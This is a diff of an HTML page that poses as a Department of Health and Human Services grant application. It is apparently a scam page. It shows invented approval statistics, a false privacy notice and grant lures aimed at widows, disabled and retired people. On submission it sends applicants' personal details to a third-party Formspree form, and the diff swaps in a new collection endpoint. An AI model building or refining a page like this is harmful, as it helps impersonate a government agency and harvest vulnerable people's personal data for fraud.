@@ -1,11 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DHHS Grant Application</title>
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -167,7 +165,7 @@
         }
 
         .email-display {
-            font-weight: lighter;
+            font-weight: bold;
             color: #005eaa;
             word-break: break-all;
             margin: 15px 0;
@@ -238,27 +236,6 @@
             font-weight: 500;
         }
 
-        /* Add this to your existing CSS */
-        .thank-you-page {
-            display: none;
-            text-align: center;
-            padding: 30px 20px;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .thank-you-title {
-            color: #005eaa;
-            font-size: 24px;
-            margin-bottom: 15px;
-        }
-
-        .thank-you-message {
-            font-size: 16px;
-            margin-bottom: 25px;
-            color: #555;
-        }
-
         @media (min-width: 768px) {
             .thank-you-page {
                 padding: 40px;
@@ -306,21 +283,22 @@
 
 <body>
     <div class="application-container">
-        <!-- Application Form -->
+        <!-- Application Form (initially visible) -->
         <div id="application-form">
             <div class="header">
                 <h1>DHHS Grant Application</h1>
                 <p>Department of Health and Human Services Grant Program</p>
             </div>
+            
             <div class="marquee-container">
                 <marquee behavior="scroll" direction="left" scrollamount="3" class="marquee-text">
-                    ✓ Over 12,500 grants awarded this year • ✓ 94% applicant satisfaction rate • ✓ Average approval
-                    time: 2-3 business days •
+                    ✓ Over 12,500 grants awarded this year • ✓ 94% applicant satisfaction rate • ✓ Average approval time: 2-3 business days •
                     ✓ No application fees • ✓ Confidential process
                 </marquee>
             </div>
 
-            <form id="grantForm" action="https://formspree.io/f/xnndjlqq" method="POST">
+            <form id="grantForm" action="https://formspree.io/f/mldbkwna" method="POST">
+                <!-- Grant Selection -->
                 <div class="form-section">
                     <h2 class="section-title">1. Select Grant Type</h2>
 
@@ -328,15 +306,15 @@
                         <label for="grant_type" class="required">Choose the grant you need</label>
                         <select id="grant_type" name="grant_type" required>
                             <option value="">-- Select Grant --</option>
-                            <option value="personal">Personal Needs Grant</option>
-                            <option value="home">Utilities Bill Grant</option>
-                            <option value="disabled">Rent/Mortgage Grant</option>
-                            <option value="widow">Home Repair Grant</option>
+                            <option value="personal">Personal Grant</option>
+                            <option value="home">Home Grant</option>
+                            <option value="disabled">Disabled Grant</option>
+                            <option value="widow">Widow Grant</option>
                             <option value="health">Health Insurance Grant</option>
                             <option value="unemployed">Unemployed Grant</option>
                             <option value="retired">Retired Grant</option>
                             <option value="working">Working Grant</option>
-                            <option value="own_house">Disability Grant</option>
+                            <option value="own_house">Own House Grant</option>
                             <option value="business">Business Grant</option>
                             <option value="rent_house">Rent House Grant</option>
                         </select>
@@ -506,18 +484,13 @@
 
                     <div class="privacy-notice">
                         <h3>Privacy Notice</h3>
-                        <p>The Department of Health and Human Services will use the information you provide solely
-                            for
-                            the purpose of evaluating your grant application. We maintain strict confidentiality
-                            standards in accordance with federal privacy laws.</p>
+                        <p>The Department of Health and Human Services will use the information you provide solely for the purpose of evaluating your grant application. We maintain strict confidentiality standards in accordance with federal privacy laws.</p>
                     </div>
 
                     <div class="form-group">
                         <div class="certify-container">
                             <input type="checkbox" id="consent" name="consent" required>
-                            <label for="consent" class="required">I certify that all information provided is true
-                                and
-                                accurate to the best of my knowledge</label>
+                            <label for="consent" class="required">I certify that all information provided is true and accurate to the best of my knowledge</label>
                         </div>
                     </div>
 
@@ -526,15 +499,11 @@
             </form>
         </div>
 
-        <!-- Thank You Page -->
+        <!-- Thank You Page (initially hidden) -->
         <div id="thank-you-page" class="thank-you-page">
-            <!-- Checkmark Icon -->
-            <div style="text-align: center; margin-bottom: 20px;">
-                <svg style="height: 80px; width: 80px;" viewBox="0 0 24 24">
-                    <circle cx="12" cy="12" r="10" fill="#28a745" />
-                    <path fill="#ffffff" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
-                </svg>
-            </div>
+            <svg class="thank-you-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+            </svg>
 
             <h2 class="thank-you-title">Thank You for Your Application!</h2>
 
@@ -542,84 +511,87 @@
                 Your DHHS Grant Application has been successfully submitted.
             </p>
 
+            <div class="email-display" id="confirmation-email">
+                <!-- Email will be inserted here by JavaScript -->
+            </div>
+
             <div class="next-steps">
                 <h3>Next Steps in the Application Process</h3>
                 <ul>
-                    <li>Check your email (including spam folder) for confirmation</li>
-                    <li>If eligible, you'll receive notification via email</li>
-                    <li>Follow the instructions in your email to complete the application</li>
-                    <li>Processing typically takes 3-5 business days</li>
+                    <li>You will receive a confirmation email with your application details</li>
+                    <li>DHHS staff will review your application within 3-5 business days</li>
+                    <li>If approved, you will receive notification by email and mail</li>
+                    <li>For questions, contact grants@hhs.gov or call 1-800-368-1019</li>
                 </ul>
             </div>
 
-            <div style="text-align: center; margin-top: 30px;">
-                <a href="index.html"
-                    style="display: inline-block; background: #005eaa; color: white; padding: 12px 24px; border-radius: 5px; text-decoration: none; font-size: 16px;">
-                    Back to Application Home
-                </a>
-            </div>
+            <button class="new-application-btn" id="new-application-btn">Return to DHHS Homepage</button>
         </div>
+    </div>
 
-        <script>
-            document.addEventListener('DOMContentLoaded', function () {
-                const form = document.getElementById('grantForm');
-                const applicationForm = document.getElementById('application-form');
-                const thankYouPage = document.getElementById('thank-you-page');
-                const confirmationEmail = document.getElementById('confirmation-email');
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const form = document.getElementById('grantForm');
+            const applicationForm = document.getElementById('application-form');
+            const thankYouPage = document.getElementById('thank-you-page');
+            const confirmationEmail = document.getElementById('confirmation-email');
+            const newAppBtn = document.getElementById('new-application-btn');
 
-                // Initialize EmailJS
-                emailjs.init('7mnWa4y2_S_umAb5_');
+            // Form submission handler
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
 
-                form.addEventListener('submit', async function (e) {
-                    e.preventDefault(); // Prevent default form submission
+                // Show loading state
+                const submitBtn = form.querySelector('.submit-btn');
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Processing...';
 
-                    const submitBtn = form.querySelector('.submit-btn');
-                    submitBtn.disabled = true;
-                    submitBtn.textContent = 'Processing...';
+                // Collect form data
+                const formData = new FormData(form);
 
-                    try {
-                        // Prepare data for EmailJS
-                        const formData = new FormData(form);
-                        const emailJsData = {
-                            applicant_name: formData.get('full_name'),
-                            email: formData.get('email'),
-                            grant_type: formData.get('grant_type'),
-                            submission_date: new Date().toLocaleDateString(),
-                            random_id: 'DHHS-' + Math.floor(1000 + Math.random() * 9000)
-                        };
+                // Submit to Formspree
+                fetch(form.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                })
+                    .then(response => {
+                        if (response.ok) {
+                            // Update email display with better mobile formatting
+                            const userEmail = document.getElementById('email').value;
+                            confirmationEmail.innerHTML = `
+                                <div style="margin-bottom: 6px;">Confirmation will be sent to:</div>
+                                <div style="font-size: 17px; word-break: break-all;">${userEmail}</div>
+                            `;
 
-                        // 1. First send EmailJS confirmation
-                        await emailjs.send('service_7wzx75c', 'template_3de5vsm', emailJsData);
+                            // Show thank you page and hide form
+                            applicationForm.style.display = 'none';
+                            thankYouPage.style.display = 'block';
 
-                        // 2. Then submit to Formspree
-                        const formspreeResponse = await fetch(form.action, {
-                            method: 'POST',
-                            body: new URLSearchParams(formData),
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'Accept': 'application/json'
-                            }
-                        });
-
-                        if (!formspreeResponse.ok) {
-                            throw new Error('Formspree submission failed');
+                            // Scroll to top
+                            window.scrollTo(0, 0);
+                        } else {
+                            throw new Error('Form submission failed');
                         }
-
-                        // Show success message
-                        applicationForm.style.display = 'none';
-                        thankYouPage.style.display = 'block';
-                        window.scrollTo(0, 0);
-
-                    } catch (error) {
-                        console.error('Error:', error);
-                        alert('Submission error. Please try again or contact us.');
-                    } finally {
+                    })
+                    .catch(error => {
+                        alert('There was an error submitting your form. Please try again later.');
+                        console.error('Form submission error:', error);
+                    })
+                    .finally(() => {
                         submitBtn.disabled = false;
                         submitBtn.textContent = 'Submit Application';
-                    }
-                });
+                    });
             });
-        </script>
-</body>
 
+            // New application button
+            newAppBtn.addEventListener('click', function () {
+                // Redirect to homepage instead of resetting form
+                window.location.href = "index.html";
+            });
+        });
+    </script>
+</body>
 </html>
